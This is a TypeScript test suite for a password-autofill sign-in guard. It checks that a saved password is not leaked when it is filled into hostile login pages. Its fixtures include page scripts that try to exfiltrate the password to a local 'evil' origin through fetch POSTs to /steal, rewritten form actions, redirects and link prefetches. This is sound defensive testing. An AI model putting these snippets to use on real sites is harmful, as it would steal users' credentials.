import { createHash } from "node:crypto";
import { createSocket } from "node:dgram";
import { once } from "node:events";
import type { IncomingMessage, ServerResponse } from "node:http";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import type { Duplex } from "node:stream";

import type { Page as WorkerPage } from "@cloudflare/playwright";
import type { Browser, BrowserContext, Page, Request, Route } from "playwright";
import { chromium } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { MAX_GUARDED_BODY_BYTES, signIn } from "./login";

const SAVED_SECRET = "s3cret-pw";

type FallbackOptions = Parameters<Route["fallback"]>[0];

/** The outcome of a sign-in that typed the stand-in and sent the form, or ran the page's submit handler that held it back. */
const REACHED_SEND = /^(?:The login form was not sent: the page held it back|The page tried to send .+|The password could not be cleared .+)?$/u;

/** A probe of a round of guesses: its round and its guess. */
const PROBE_RE = /^\/probe\?r=(\d+)&g=(.+)$/u;

/** What a test page logs once its form's submit handler runs. */
const SUBMITTED = "reached: submit handler";

/** A command answer that never comes. */
const NEVER = new Promise<never>(() => {
    // Never settles.
});

interface Hit {
    body: string;
    method: string;
    url: string;
}

type Handler = (request: IncomingMessage, response: ServerResponse, body: string) => void;

/** A local site on its own host, so two of them are two origins. Records every request with its body, and every WebSocket it accepts and each frame sent on one. */
const site = async (host: string, handler: Handler) => {
    const hits: Hit[] = [];
    const server = createServer((request, response) => {
        let body = "";

        request.on("data", (chunk: Buffer) => {
            body += chunk.toString();
        });
        request.on("end", () => {
            hits.push({ body, method: request.method ?? "", url: request.url ?? "" });
            handler(request, response, body);
        });
    });

    server.on("upgrade", (request: IncomingMessage, socket: Duplex) => {
        hits.push({ body: "", method: "WEBSOCKET", url: request.url ?? "" });
        // The low four bits of a frame's first byte: 1 is text, 8 is a close.
        socket.on("data", (frame: Buffer) => {
            hits.push({ body: "", method: `FRAME ${(frame[0] ?? 0) & 0x0f}`, url: request.url ?? "" });
        });
        socket.write(
            // eslint-disable-next-line sonarjs/hashing -- the WebSocket handshake is defined with SHA-1
            `HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1")
                .update(`${request.headers["sec-websocket-key"] ?? ""}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
                .digest("base64")}\r\n\r\n`,
        );
    });
    server.listen(0, host);
    await once(server, "listening");

    return { close: () => server.close(), hits, origin: `http://${host}:${(server.address() as AddressInfo).port}` };
};

/** A page in UTF-8, as it says, unless its markup names a charset of its own: one that names none is read as windows-1252. */
const html = (response: ServerResponse, markup: string): void => {
    response.setHeader("content-type", "text/html");
    response.end(`<!doctype html>${markup.includes("<meta charset") ? "" : '<meta charset="utf-8">'}<title>Sign in</title>${markup}`);
};

/** The two fields of every login page here: a username and a password. */
const FIELDS = `<input name="user"><input name="pw" type="password">`;

/** `text` as a JavaScript string literal safe inside a `<script>` of the page: no `<`, `>` or line separator stays raw. */
const scriptString = (text: string): string =>
    JSON.stringify(text).replaceAll(/[<>\u{2028}\u{2029}]/gu, (character) => String.raw`\u` + (character.codePointAt(0) ?? 0).toString(16).padStart(4, "0"));

const loginForm = (script = "", attributes = 'method="post" action="/session"'): string =>
    `<form ${attributes}>${FIELDS}<button>Go</button></form><script>${script}</script>`;

describe(signIn, () => {
    let browser: Browser;
    let context: BrowserContext;
    let page: Page;
    let evil: Awaited<ReturnType<typeof site>>;
    let login: Awaited<ReturnType<typeof site>>;
    /** What the login site serves at `/` and answers at `/session`; each case sets them. */
    const fixture: {
        evil: string;
        headers: Record<string, string>;
        home: string;
        onMoved: (response: ServerResponse) => void;
        onSession: Handler;
        page: string;
        popup: string;
        rules: string;
        worker: string;
    } = {
        evil: "",
        headers: {},
        home: "",
        onMoved: (response) => response.end(),
        onSession: () => undefined,
        page: "",
        popup: "",
        rules: "",
        worker: "",
    };
    /** Every UDP datagram the other site's address receives: where WebRTC talks to a TURN server. */
    const datagrams: string[] = [];
    const udp = createSocket("udp4", (message) => {
        datagrams.push(message.toString("latin1"));
    });
    let turn = "";
    /** What the tab's pages logged to the console. */
    const logged: string[] = [];
    let pageLoads = 0;

    beforeAll(async () => {
        // Cross-site frames in their own process, as with site isolation: each is a target of its own.
        browser = await chromium.launch({ args: ["--site-per-process"] });
        evil = await site("127.0.0.2", (request, response) => {
            if (request.url === "/relay") {
                html(response, fixture.evil);
            } else if (request.url === "/bounce") {
                response.writeHead(302, { location: `${login.origin}/` });
                response.end();
            } else {
                response.end("ok");
            }
        });
        await new Promise<void>((resolve) => {
            udp.bind(0, "127.0.0.2", resolve);
        });
        turn = `turn:127.0.0.2:${udp.address().port}`;
        login = await site("127.0.0.1", (request, response, body) => {
            switch (request.url?.split("?", 1)[0]) {
                case "/home": {
                    html(response, fixture.home);
                    break;
                }
                case "/moved.png": {
                    fixture.onMoved(response);
                    break;
                }
                case "/popup": {
                    html(response, fixture.popup);
                    break;
                }
                case "/rules.json": {
                    response.setHeader("content-type", "application/speculationrules+json");
                    response.end(fixture.rules);
                    break;
                }
                case "/session": {
                    fixture.onSession(request, response, body);
                    break;
                }
                case "/worker.js": {
                    response.setHeader("content-type", "text/javascript");
                    response.end(fixture.worker);
                    break;
                }
                default: {
                    for (const [name, value] of Object.entries(fixture.headers)) {
                        response.setHeader(name, value);
                    }

                    // A value the site renders afresh on each load, as an identity provider's `session_code` is.
                    pageLoads += 1;
                    html(
                        response,
                        fixture.page.replaceAll("PER_LOAD", () => `Kq7${String(pageLoads).padStart(13, "0")}`),
                    );
                }
            }
        });
    });

    afterAll(async () => {
        await browser.close();
        evil.close();
        login.close();
        udp.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
        logged.length = 0;
        page.on("console", (message) => {
            logged.push(message.text());
        });
        evil.hits.length = 0;
        login.hits.length = 0;
        fixture.headers = {};
        datagrams.length = 0;
        fixture.home = "<h1>Home</h1>";
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/home" });
            response.end();
        };
    });

    afterEach(async () => {
        await context.close();
    });

    const run = async (now: () => number = Date.now, url = `${login.origin}/`, deadline = Date.now() + 30_000, password = SAVED_SECRET) =>
        signIn(
            // The Worker's fork of the same API; its types differ only in a few narrower overloads.
            page as unknown as WorkerPage,
            {
                deadline,
                navTimeout: 10_000,
                now,
                origin: login.origin,
                pageTimeout: 5000,
                password,
                url,
                username: "ann",
            },
        );

    const passwordLeft = async (): Promise<boolean> =>
        page.evaluate((secret) => [...document.querySelectorAll("input")].some((input) => input.value === secret), SAVED_SECRET);

    /** Whether a sign-in that typed nothing left the tab on a blank page, with the lock lifted from it. */
    const leftBlank = async (): Promise<boolean> =>
        page.url() === "about:blank" && (await page.evaluate(() => typeof RTCPeerConnection === "function" && typeof Worker === "function"));

    const sessionPosts = (): Hit[] => login.hits.filter((hit) => hit.url === "/session");

    /**
     * Has the `call`th `Emulation.setScriptExecutionDisabled` of the tab's DevTools sessions (from 1) answered by `answer`,
     * told whether it turns them off (`isOff`).
     */
    const scriptsOff = (answer: (call: number, send: () => Promise<unknown>, isOff: boolean) => Promise<unknown>): void => {
        const { newCDPSession } = context;
        let calls = 0;

        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { send } = session;

            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
                if (method !== "Emulation.setScriptExecutionDisabled") {
                    return send.call(session, method as never, params as never);
                }

                calls += 1;

                return answer(
                    calls,
                    async () => send.call(session, method as never, params as never),
                    (params as { value?: boolean } | undefined)?.value === true,
                );
            }) as typeof send;

            return session;
        };
    };

    /**
     * Has each `route.fallback` of the browser go through `fallback`, and tells `abort` of each `route.abort`, until
     * `afterEach` puts the methods back.
     */
    const aroundRoutes = async (spies: {
        abort?: (route: Route) => void;
        fallback?: (next: (options?: FallbackOptions) => Promise<void>, options: FallbackOptions | undefined, route: Route) => Promise<void>;
    }) => {
        let prototype: Pick<Route, "abort" | "fallback"> | undefined;

        await page.route("**/probe", async (route) => {
            prototype = Object.getPrototypeOf(route) as Pick<Route, "abort" | "fallback">;
            await route.fulfill({ body: "" });
        });
        await page.goto(`${login.origin}/probe`);
        await page.unroute("**/probe");

        const owner = prototype as Pick<Route, "abort" | "fallback">;
        const { abort, fallback } = owner;

        if (spies.fallback) {
            const around = spies.fallback;

            owner.fallback = new Proxy(fallback, {
                apply: async (target, route: Route, [options]: [FallbackOptions?]) =>
                    around(async (next) => Reflect.apply(target, route, [next]) as Promise<void>, options, route),
            });
        }

        if (spies.abort) {
            const told = spies.abort;

            owner.abort = new Proxy(abort, {
                apply: async (target, route: Route, args: Parameters<Route["abort"]>) => {
                    told(route);

                    return Reflect.apply(target, route, args) as Promise<void>;
                },
            });
        }

        restoreRoutes = () => {
            owner.abort = abort;
            owner.fallback = fallback;
        };
    };

    let restoreRoutes = (): void => undefined;

    afterEach(() => {
        restoreRoutes();
        restoreRoutes = () => undefined;
    });

    it("sends the form by POST to the login's origin and reports where it landed", async () => {
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
        // The lock is lifted with the cleanup: the page the session goes on with has WebRTC and runs workers.
        const workerRan = await page.evaluate(
            async () =>
                new Promise((resolve) => {
                    const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(true)"])));

                    worker.addEventListener("message", (event) => resolve(event.data));
                }),
        );

        expect(workerRan).toBe(true);
        expect(await page.evaluate(() => typeof RTCPeerConnection)).toBe("function");
    });

    it.each([
        ["as the password is typed", `document.forms[0].pw.addEventListener("input", () => { document.forms[0].action = "EVIL/steal"; });`],
        ["in its submit handler", `document.forms[0].addEventListener("submit", () => { document.forms[0].action = "EVIL/steal"; });`],
    ])("does not send a form whose action a script moves to another site %s", async (_when, script) => {
        fixture.page = loginForm(script.replace("EVIL", () => evil.origin));

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("blocks a submit handler that posts the password to another site, and clears the field", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("${evil.origin}/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("keeps blocking after a decoy request and a same-document navigation", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/beacon", { body: "event=submit", method: "POST" }); history.pushState({}, "", "/next"); fetch("EVIL/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`.replace(
                "EVIL",
                () => evil.origin,
            ),
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("does not count a same-origin request without the password as the form being sent", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("/beacon", { body: "event=submit", method: "POST" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it.each([
        [
            "by fetch as JSON",
            `fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" });`,
        ],
        ["with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
        [
            "on a WebSocket",
            `const socket = new WebSocket("WS/socket"); socket.onopen = () => socket.send(JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }));`,
        ],
    ])("reports a script that signs in %s as a sign-in it cannot fill, and sends nothing", async (_how, send) => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send.replace("WS", () => login.origin.replace("http", "ws"))} });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("signs in with a script"), scriptSignIn: true, submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.method === "POST" || hit.method === "FRAME 1")).toStrictEqual([]);
    });

    it("signs in when a submit handler writes a blank frame's document first", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => { const frame = document.createElement("iframe"); document.body.append(frame); frame.contentDocument.open(); frame.contentDocument.write("<p>widget</p>"); frame.contentDocument.close(); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
    });

    it("gives page scripts only a stand-in, however they read the field, and sends the password in the form's own POST", async () => {
        const seen: string[] = [];

        await page.exposeFunction("seen", (values: string[]) => {
            seen.push(...values);
        });
        fixture.page = loginForm(
            `const form = document.forms[0]; const field = form.pw; const read = []; let keys = "";
            for (const type of ["beforeinput", "input", "compositionend"]) field.addEventListener(type, (event) => read.push(event.data ?? ""));
            field.addEventListener("keydown", (event) => { keys += event.key; });
            form.addEventListener("submit", () => {
                const frame = document.createElement("iframe"); document.body.append(frame);
                read.push(keys, field.value, form.elements.pw.value, String(new FormData(form).get("pw")), field.getAttribute("value") ?? "", Object.getOwnPropertyDescriptor(frame.contentWindow.HTMLInputElement.prototype, "value").get.call(field), structuredClone(field.value));
                field.setSelectionRange(0, field.value.length); read.push(field.value.slice(field.selectionStart, field.selectionEnd));
                for (const value of read) for (const rel of ["preconnect", "dns-prefetch"]) document.head.append(Object.assign(document.createElement("link"), { href: "http://" + encodeURIComponent(value || "empty") + ".invalid", rel }));
                window.seen(read);
            });`,
        );

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(seen.filter((value) => value.length >= 16)).not.toHaveLength(0);
        expect(seen.filter((value) => value.includes(SAVED_SECRET))).toStrictEqual([]);
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it.each([
        [
            "copies the stand-in into the username field",
            `document.forms[0].addEventListener("submit", () => { document.forms[0].user.value = document.forms[0].pw.value; });`,
        ],
        [
            "posts it in a form of its own to another address of the site",
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const form = Object.assign(document.createElement("form"), { action: "/profile", method: "post" }); form.append(Object.assign(document.createElement("input"), { name: "pw", value: document.forms[0].pw.value })); document.body.append(form); form.submit(); });`,
        ],
    ])("sends no password when the page %s", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.body.includes(SAVED_SECRET))).toStrictEqual([]);
    });

    it("runs no script of the sign-in's answer, which could read what the site shows of it", async () => {
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><script>fetch("/ran");</script>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        // The answer alone, without scripts: the page is never loaded again, and the session goes on from a blank tab.
        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home"]);
        expect(page.url()).toBe("about:blank");
    });

    it("takes a 300 answer to the form's POST as the answer, not as a redirect still to come", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(300, { "content-type": "text/html" });
            response.end("<!doctype html><title>Choose</title><p>Pick an account</p>");
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/session` });
    });

    it("signs in when the site answers the form's POST at once, with no redirect", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            html(response, "<h1>Welcome</h1>");
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/session` });
        expect(sessionPosts().filter((hit) => hit.method === "POST")).toHaveLength(1);
    });

    it.each([
        ["changes its enctype", `form.enctype = "multipart/form-data";`],
        ["changes its accept-charset", `form.acceptCharset = "ISO-8859-1";`],
        ["sends it later with another enctype", `event.preventDefault(); setTimeout(() => { form.enctype = "multipart/form-data"; form.submit(); });`],
    ])("does not send the form when a submit handler %s from the form the site served", async (_what, change) => {
        fixture.page = loginForm(`const form = document.forms[0]; form.addEventListener("submit", (event) => { ${change} });`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed how it encodes"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("closes the session when the tab's scripts cannot be turned back on after the sign-in", async () => {
        scriptsOff(async (_call, send, isOff) => (isOff ? send() : Promise.reject(new Error("Target closed"))));
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("sends the password in a multipart form's own POST", async () => {
        fixture.page = loginForm("", 'method="post" action="/session" enctype="multipart/form-data"');

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()[0]?.body).toContain(`name="pw"\r\n\r\n${SAVED_SECRET}\r\n`);
    });

    it("signs in when an image of the login's site redirects to another site by 307", async () => {
        fixture.page = loginForm(
            `document.forms[0].pw.addEventListener("input", () => document.body.append(Object.assign(document.createElement("img"), { src: "/moved.png" })));`,
        );
        fixture.onMoved = (response) => {
            response.writeHead(307, { location: `${evil.origin}/cdn.png` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(login.hits.some((hit) => hit.url === "/moved.png")).toBe(true);
    });

    it("waits for a slow server's answer before it reports where the form landed", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            setTimeout(() => {
                response.writeHead(303, { location: "/home" });
                response.end();
            }, 2500);
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it.each(["_parent", "_top"])("signs in with a form whose target %s is the top window it is in", async (target) => {
        fixture.page = loginForm("", `method="post" action="/session" target="${target}"`);

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("signs in when the form's address carries a value the site renders afresh on each load, loading the page once", async () => {
        fixture.page = loginForm("", 'method="post" action="/session?session_code=PER_LOAD&client_id=app"');

        const loadsBefore = pageLoads;
        const result = await run();
        const posts = login.hits.filter((hit) => hit.method === "POST");

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(pageLoads - loadsBefore).toBe(1);
        expect(posts).toStrictEqual([
            { body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: `/session?session_code=Kq7${String(pageLoads).padStart(13, "0")}&client_id=app` },
        ]);
    });

    it("types nothing into a form that would post from another window", async () => {
        fixture.page = loginForm("", 'method="post" action="/session" target="_blank"');

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it.each([
        ["holds one", `<form method="post" action="/session">${FIELDS}<input type="file" name="avatar"><button>Go</button></form>`],
        [
            "is tied one by a form attribute",
            `<form id="f" method="post" action="/session">${FIELDS}<button>Go</button></form><input type="file" name="avatar" form="f">`,
        ],
        [
            "had one the site sent, which a script took out",
            `<form method="post" action="/session">${FIELDS}<input type="file" name="avatar"><button>Go</button></form><script>document.querySelector("[type=file]").remove();</script>`,
        ],
        ["is given one by a script", loginForm('document.forms[0].append(Object.assign(document.createElement("input"), { name: "avatar", type: "file" }));')],
    ])("types nothing into a login form that %s file input, whose file the guard would drop", async (_how, markup) => {
        fixture.page = markup;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("has a file input"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(await leftBlank()).toBe(true);
    });

    it.each([
        ["once the password is typed", 'pw.addEventListener("input", add);'],
        ["in a submit handler", 'document.forms[0].addEventListener("submit", add);'],
    ])("sends nothing when a script adds a file input to the login form %s", async (_when, listen) => {
        fixture.page = loginForm(
            `const pw = document.forms[0].pw; const add = () => document.forms[0].append(Object.assign(document.createElement("input"), { name: "avatar", type: "file" })); ${listen}`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("added a file input"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("signs in when the page it lands on embeds another site", async () => {
        fixture.page = loginForm();
        fixture.home = `<h1>Home</h1><iframe src="${evil.origin}/widget"></iframe>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(evil.hits.filter((hit) => hit.body !== "")).toStrictEqual([]);
    });

    it("reports a login page shown again as a password field that remains", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ passwordFieldRemains: true, submitted: true, success: true });
    });

    it("types nothing into a form that a base element sends to another window", async () => {
        fixture.page = `<base target="_blank">${loginForm()}`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("blocks a form a submit handler sends to another window", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", () => { document.forms[0].target = "_blank"; });`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it.each([
        [307, "to another site", () => `${evil.origin}/steal`],
        [308, "to another site", () => `${evil.origin}/steal`],
        // The browser takes this address; a strict URL parser does not.
        // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
        [307, "whose address does not parse", () => "http://a b/"],
    ])("fails a %i redirect %s, and reports the form as sent", async (status, _where, location) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(status, { location: location() });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: true, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("sends the form from its first enabled submit button, an image one, with that button's address", async () => {
        fixture.page = `<form method="post" action="/elsewhere">${FIELDS}<button disabled formaction="/disabled">Go</button><input type="image" alt="Go" formaction="/session"></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}&x=0&y=0`, method: "POST", url: "/session" }]);
    });

    it("sends a form whose controls are named like the form's own properties, and gives no method one", async () => {
        const shadows = ["acceptCharset", "enctype", "method", "requestSubmit"];

        fixture.page = `<img name="URL" alt=""><img name="characterSet" alt=""><img name="defaultView" alt=""><form action="/session">${FIELDS}${shadows.map((name) => `<input type="hidden" name="${name}">`).join("")}<button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([
            { body: `user=ann&pw=${SAVED_SECRET}&${shadows.map((name) => `${name}=`).join("&")}`, method: "POST", url: "/session" },
        ]);
    });

    it("does not send a login form whose POST is larger than the guard reads, and aborts a large upload to the site unread", async () => {
        fixture.page = loginForm(
            `document.forms[0].big.value = "x".repeat(${MAX_GUARDED_BODY_BYTES}); document.forms[0].pw.addEventListener("input", () => fetch("/upload", { body: "y".repeat(${MAX_GUARDED_BODY_BYTES + 1}), method: "POST" }).catch(() => undefined), { once: true });`,
        ).replace("<button>", '<input type="hidden" name="big"><button>');

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("more than"), submitted: false, success: false });
        // Not the page's log of the refusal: the cleanup can leave the page before the rejected fetch reaches it.
        expect(login.hits.filter((hit) => ["/session", "/upload"].includes(hit.url))).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("clears the password when the page throws after it was typed", async () => {
        fixture.page = loginForm(`HTMLFormElement.prototype.requestSubmit = () => { throw new Error("broken"); };`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(result).not.toHaveProperty("sessionClosed");
        expect(await passwordLeft()).toBe(false);
    });

    it("reports a form the page held back as not sent", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => event.preventDefault());`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
        expect(await passwordLeft()).toBe(false);
    });

    it("types nothing into a password field outside a form", async () => {
        fixture.page = FIELDS;

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("reports a sign-in whose answer fails to load as sent, not signed in", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            // A redirect the browser itself refuses to follow.
            // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
            response.writeHead(307, { location: "http://[" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not load"), submitted: true, success: false });
    });

    it("closes the page and the session when the hold ends after the password was typed", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", () => window.endHold());`);

        const result = await run(() => Date.now() + offset);

        expect(result).toMatchObject({ sessionClosed: true, submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(page.isClosed()).toBe(true);
    });

    it("closes the page rather than clear it past the hold when the sign-in lands at its end", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm();
        // The answer runs no script: the site ends the hold as it serves it.
        Object.defineProperty(fixture, "home", {
            configurable: true,
            get: () => {
                offset = 60_000;

                return "<h1>Home</h1>";
            },
        });

        const result = await run(() => Date.now() + offset);

        Reflect.deleteProperty(fixture, "home");

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it.each([
        ["as the form sent it", (body: string) => `/home?${body}`],
        ["in another spelling", () => `/home?echo=${encodeURIComponent(SAVED_SECRET).toLowerCase()}`],
        ["encoded twice", () => `/home?returnTo=${[...SAVED_SECRET].map((character) => `%25${character.codePointAt(0)?.toString(16)}`).join("")}`],
        ["as its user info", () => `${login.origin.replace("//", () => `//ann:${SAVED_SECRET}@`)}/home`],
    ])("fails a redirect of the sign-in that echoes the password into the address %s", async (_how, location) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            response.writeHead(303, { location: location(body) });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("the password in an address"), submitted: true, success: false });
        expect(login.hits.filter((hit) => hit.url.startsWith("/home"))).toStrictEqual([]);
        expect(page.url()).not.toContain(SAVED_SECRET);
    });

    it("stops a redirect of the sign-in too long to check for a long password, saying so rather than calling it a leak", async () => {
        // 1024 characters, built here: its budget is a sixteenth of a short one's, which a 70,000-character address passes.
        const password = Array.from({ length: 1024 }, (_, index) => String.fromCodePoint(97 + ((index * 7) % 26))).join("");

        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: `/home?pad=${"x".repeat(70_000)}` });
            response.end();
        };

        const result = await run(Date.now, `${login.origin}/`, Date.now() + 30_000, password);

        expect(result).toMatchObject({ error: expect.stringContaining("too much to check"), submitted: true, success: false });
        expect(result).not.toMatchObject({ error: expect.stringContaining("the password in an address") });
        expect(login.hits.filter((hit) => hit.url.startsWith("/home"))).toStrictEqual([]);
    });

    it("blocks a redirect of the sign-in's answer to another site with the password in its path", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: `${evil.origin}/welcome/${SAVED_SECRET}` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("fails a redirect that echoes the password into the address while the form's POST is still being handed on", async () => {
        // A handing on that sends the POST before it returns, and returns only once the answer was dealt with: Playwright's
        // own sends it once the handler returned, but nothing of the guard may count on that.
        await aroundRoutes({
            fallback: async (next, options, route) => {
                if (route.request().method() !== "POST") {
                    return next(options);
                }

                const settled = new Promise<void>((resolve) => {
                    const settle = (request: Request): void => {
                        if (request === route.request()) {
                            resolve();
                        }
                    };

                    page.on("requestfinished", settle);
                    page.on("requestfailed", settle);
                });

                await route.continue(options);
                await settled;

                return undefined;
            },
        });
        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            response.writeHead(303, { location: `/home?${body}` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("the password in an address"), submitted: true, success: false });
        expect(login.hits.filter((hit) => hit.url.startsWith("/home"))).toStrictEqual([]);
    });

    it.each([
        ["switches the form to GET", `document.forms[0].addEventListener("submit", () => { document.forms[0].method = "get"; });`],
        [
            "navigates with it in the address",
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); location.href = "/next?pw=" + encodeURIComponent(document.forms[0].pw.value); });`,
        ],
    ])("blocks a same-origin request that carries the password in its address when a submit handler %s", async (_what, script) => {
        fixture.page = loginForm(script);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("in an address"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
    });

    it.each([
        ["as text", (echoed: string) => `<p>Signed in with ${echoed}</p>`],
        // Out of reach of the page's own scripts, but not of a later read of the page.
        ["in a closed shadow root", (echoed: string) => `<div><template shadowrootmode="closed"><p>Signed in with ${echoed}</p></template></div>`],
        [
            "in a closed shadow root nested deeper than one read of the page goes",
            (echoed: string) => `${"<div>".repeat(200)}<span><template shadowrootmode="closed"><p>Signed in with ${echoed}</p></template></span>`,
        ],
